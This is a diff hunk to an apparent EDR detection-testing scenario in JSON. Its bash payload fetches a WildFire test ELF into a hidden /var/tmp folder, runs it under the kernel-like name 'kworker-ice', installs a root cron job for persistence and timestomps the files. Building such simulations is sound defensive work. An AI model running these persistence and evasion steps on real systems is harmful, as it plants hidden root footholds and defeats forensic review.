@@ -149,7 +149,7 @@
     ],
     "payload": {
       "interpreter": "bash",
-      "code": "# NOT A SUBSTITUTE FOR THE SCENARIO: scenarios/edr/edr-023-cron-foothold-wildfire-elf-grouped-case.yml is the delivery path (four steps, 40 s apart).\nD=/var/tmp/.cortexsim-ice; mkdir -p \"$D\"; chmod 700 \"$D\"\ncurl -fsSL https://wildfire.paloaltonetworks.com/publicapi/test/elf -o \"$D/kworker-ice\"; chmod 755 \"$D/kworker-ice\"\ntimeout 20 \"$D/kworker-ice\"\necho '*/5 * * * * root /bin/sh /var/tmp/.cortexsim-ice/ice-run.sh' > /etc/cron.d/cortexsim-ice\ntouch -r /etc/hostname /etc/cron.d/cortexsim-ice \"$D/kworker-ice\"",
+      "code": "# NOT A SUBSTITUTE FOR THE SCENARIO: scenarios/edr/edr-023-cron-foothold-wildfire-elf-grouped-case.yml is the delivery path (four steps, 40 s apart).\nD=/var/tmp/.cortexsim-ice; rm -f /etc/cron.d/cortexsim-ice; rm -rf \"$D\"; mkdir -m 700 \"$D\"\ncurl -fsSL https://wildfire.paloaltonetworks.com/publicapi/test/elf -o \"$D/kworker-ice\"; chmod 755 \"$D/kworker-ice\"\ntimeout 20 \"$D/kworker-ice\"\nprintf '%s\\n' '*/5 * * * * root [ \"$(stat -c \\%F:\\%u:\\%a /var/tmp/.cortexsim-ice 2>/dev/null)\" = \"directory:0:700\" ] && /bin/sh /var/tmp/.cortexsim-ice/ice-run.sh || rm -f /etc/cron.d/cortexsim-ice' > /etc/cron.d/cortexsim-ice\ntouch -r /etc/hostname /etc/cron.d/cortexsim-ice \"$D/kworker-ice\"",
       "input_variables": [],
       "timeout_seconds": 180
     },
